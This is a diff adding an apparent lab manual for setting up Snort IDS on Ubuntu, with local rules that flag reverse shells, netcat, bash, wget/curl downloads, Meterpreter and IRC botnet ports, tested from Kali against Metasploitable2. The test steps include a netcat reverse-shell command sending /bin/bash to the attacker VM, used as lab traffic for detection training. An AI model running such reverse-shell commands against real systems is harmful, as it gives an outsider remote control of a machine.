@@ -1,0 +1,177 @@
+Experiment 6: Set up a network intrusion detection system to analyze
+network traffic for malware-related signatures and generate alerts on
+suspicious activity
+
+Malware Traffic Detection using Snort IDS
+To install and configure Snort IDS on Ubuntu and detect malware-related
+network signatures such as reverse shells, suspicious file downloads, and C2-
+like communication within a local network generating alerts for suspicious
+activity.
+
+️ Lab Setup
+ Ubuntu Snort IDS (Monitoring)
+ Kali Linux Attacker + Malware Traffic Generator
+ Metasploitable2 Victim System
+
+Step 1: Configure Network
+Set all VMs in Host-only network.
+Check Ips on Ubuntu, kali and Metaspoiltable2
+ifconfig
+Example:
+Kali: 192.168.45.135
+Ubuntu: 192.168.45.136
+Metasploitable2: 192.168.45.137
+Test connectivity:
+ping 192.168.45.135
+
+Step 2: Install Snort on Ubuntu
+sudo apt update
+sudo apt install snort -y
+
+Check Snort version:
+snort -V
+
+Step 3: Configure Snort HOME_NET
+Edit configuration:
+sudo nano /etc/snort/snort.conf
+Set:
+ipvar HOME_NET 192.168.45.0/24
+Save.
+
+Step 4: Add Malware Signature Rules
+Edit rules file:
+sudo nano /etc/snort/rules/local.rules
+Add these malware-related offline rules:
+
+Rule 1: Reverse Shell Detection (Port 4444)
+alert tcp any any -&gt; $HOME_NET 4444 (msg:&quot;MALWARE Reverse Shell
+Attempt Detected (Port 4444)&quot;; sid:3000001; rev:1;)
+
+Rule 2: Netcat Backdoor Traffic Detection
+alert tcp any any -&gt; $HOME_NET any (msg:&quot;MALWARE Netcat Keyword
+Detected&quot;; content:&quot;nc &quot;; nocase; sid:3000002; rev:1;)
+
+Rule 3: Suspicious Bash Shell Execution
+alert tcp any any -&gt; $HOME_NET any (msg:&quot;MALWARE Bash Shell
+Execution Pattern Detected&quot;; content:&quot;/bin/bash&quot;; nocase; sid:3000003;
+rev:1;)
+
+Rule 4: Suspicious Command Download (wget)
+alert tcp any any -&gt; $HOME_NET any (msg:&quot;MALWARE Downloader
+Command Detected (wget)&quot;; content:&quot;wget&quot;; nocase; sid:3000004; rev:1;)
+
+Rule 5: Suspicious Command Download (curl)
+alert tcp any any -&gt; $HOME_NET any (msg:&quot;MALWARE Downloader
+Command Detected (curl)&quot;; content:&quot;curl&quot;; nocase; sid:3000005; rev:1;)
+
+Rule 6: Detect Suspicious HTTP EXE Download
+alert tcp any any -&gt; $HOME_NET 80 (msg:&quot;MALWARE Possible EXE File
+Transfer Detected&quot;; flow:to_client,established; content:&quot;.exe&quot;;
+sid:3000006; rev:1;)
+
+Rule 7: Detect Meterpreter Payload Keyword
+alert tcp any any -&gt; $HOME_NET any (msg:&quot;MALWARE Meterpreter
+Payload Detected&quot;; content:&quot;meterpreter&quot;; nocase; sid:3000007;
+rev:1;)
+
+Rule 8: Detect IRC Botnet Port
+alert tcp any any -&gt; $HOME_NET 6667 (msg:&quot;MALWARE Possible IRC Botnet
+Traffic&quot;; sid:3000008; rev:1;)
+
+Save and exit.
+
+Step 5: Test Snort Configuration
+sudo snort -T -c /etc/snort/snort.conf
+Expected Output:
+Snort successfully validated the configuration. Then your set rules are correct.
+
+Step 6: Run Snort in IDS Mode
+Find interface name:
+ip link
+Example: eth0 or ens33
+Run Snort:
+sudo snort -A console -q -c /etc/snort/snort.conf -i ens33
+
+Now Snort is actively monitoring traffic.
+
+Step 7: Generate Malware-Like Traffic
+
+ Test 1: Reverse Shell Simulation (Netcat)
+On Kali (Listener):
+nc -lvnp 4444
+On Metasploitable2 (Victim):
+nc 192.168.45.135 4444 -e /bin/bash
+Expected Snort Alert:
+MALWARE Reverse Shell Attempt Detected
+
+ Test 2: Netcat Keyword (NC)
+On Kali (Listener):
+nc -lvnp 1234
+On Metasploitable2 (Victim):
+echo “nc test” |nc 192.168.45.135 1234
+Expected Snort Alert:
+
+MALWARE Netcat Keyword Detected
+
+ Test 3: /bin/bash
+On Kali (Listener):
+nc -lvnp 1234
+On Metasploitable2 (Victim):
+echo “/bin/bash” |nc 192.168.45.135 1234
+Expected Snort Alert:
+MALWARE Bash Shell Execution pattern Detected
+
+ Test 4: Simulate Malware File
+Transfer (Fake EXE) On Kali create
+a fake exe:
+echo &quot;fake malware file&quot; &gt; malware.exe
+Start local HTTP server (offline):
+python3 -m http.server 80
+On Metasploitable2 download file:
+wget http://&lt;Kali IP&gt;/malware.exe
+Expected Snort Alert:
+MALWARE Possible EXE File Transfer
+Detected
+MALWARE Downloader Command
+Detected (wget)
+
+ Test 5: Simulate Curl Based
+Malware Downloader
+On Metasploitable2:
+curl http://&lt;Kali IP&gt;/malware.exe
+Expected Snort Alert:
+MALWARE Downloader Command Detected (curl)
+
+ Test 6: Meterpreter Download
+On kali
+Nc -lvnp 1234
+On Metasploitable2:
+Echo “meterpreter” | nc &lt;kali-ip&gt; 1234
+Expected Snort Alert:
+MALWARE Meterpreter Payload Detected
+
+ Test 7: Simulate IRC Botnet
+Communication On Kali run
+listener:
+nc -lvp 6667
+On Metasploitable2 connect:
+nc 192.168.45.135 6667
+Expected Snort Alert:
+MALWARE Possible IRC Botnet Traffic
+
+Step 8: View Snort Alerts Log
+To check alert file:
+sudo cat /var/log/snort/alert
+To monitor continuously:
+sudo tail -f /var/log/snort/alert
+
+Result
+Snort IDS installed on Ubuntu successfully detected malware-like traffic
+patterns such as reverse shell communication, suspicious downloader
+commands, fake malware file transfer, and botnet-style communication
+without requiring internet access.
+
+Conclusion
+This experiment demonstrates how Snort performs signature-based malware
+detection in an offline network by analyzing packet content and matching it
+with malware-related IDS rules.
